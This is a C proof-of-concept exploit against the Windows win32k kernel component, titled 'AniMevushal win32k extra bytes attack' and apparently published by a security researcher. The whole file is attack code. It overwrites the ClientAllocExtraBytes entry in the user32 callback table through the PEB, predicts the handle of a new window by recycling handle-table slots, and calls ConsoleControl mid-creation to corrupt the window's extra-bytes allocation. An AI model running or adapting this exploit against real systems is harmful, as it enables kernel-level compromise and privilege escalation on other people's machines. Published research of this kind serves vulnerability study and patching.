//
// AniMevushal win32k extra bytes attack
// 21/2/2020
// Gil Dabah
//

#include <stdio.h>
#include <windows.h>
unsigned int NBYTES = 100;

HWND g_hWnd = NULL;
LRESULT CALLBACK wndproc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	printf("%x\n", message);

	return DefWindowProc(hWnd, message, wParam, lParam);
}

LRESULT CALLBACK wndprochook(int nCode, WPARAM wParam, LPARAM lParam)
{
	PCWPSTRUCT p = (PCWPSTRUCT)lParam;
	return 0;
}

#define ClientAllocExtraBytes_NO 0x7b

typedef NTSTATUS(*faeb_ptr)(ULONG_PTR);
faeb_ptr g_faeb = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

void doconsole()
{
	HMODULE hMod = GetModuleHandle("user32");
	if (hMod == NULL) return;

	typedef struct _CONSOLEWINDOWOWNER {
		HWND hwnd;
		ULONG ProcessId;
		ULONG ThreadId;
	} CONSOLEWINDOWOWNER, * PCONSOLEWINDOWOWNER;

	typedef NTSTATUS(WINAPI* PfnConsoleControl)(int Command, PVOID Information, DWORD Length);
	static PfnConsoleControl pfn = (PfnConsoleControl)GetProcAddress(hMod, "ConsoleControl");
	CONSOLEWINDOWOWNER cwo = { 0 };
	cwo.hwnd = g_hWnd;
	pfn(6, &cwo, sizeof(cwo));
}

LRESULT CALLBACK faeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #2\n");
		printf("Client alloc extra bytes called\n");

		// Predict the HWND of our newly created window.
		// we know that a UI handle is divided to two parts, high word and low word.
		// The high word is the one that has the handle unique number,
		// and is bumped by one every time an object is freed.
		// So we use the last g_hWnd1 from the windows we created initially in main.
		// And add one for it to compensate on that last window destruction.
		WORD nextHandle = HIWORD(g_hWnd) + 1;
		// The low word is the index into the handle table, and stays the same.
		WORD indexHandle = LOWORD(g_hWnd);
		// And now we form a DWORD out of these two words, hopefully with the correct full HWND.
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %d\n", IsWindow(g_hWnd));

		doconsole();

		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
	}

	return g_faeb(a);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

int main(int argc, char* argv[])
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = "animevushal";
	wc.lpfnWndProc = wndproc;
	wc.cbWndExtra = NBYTES;
	RegisterClass(&wc);

	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}
	
	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);

	g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

	return 0;
}
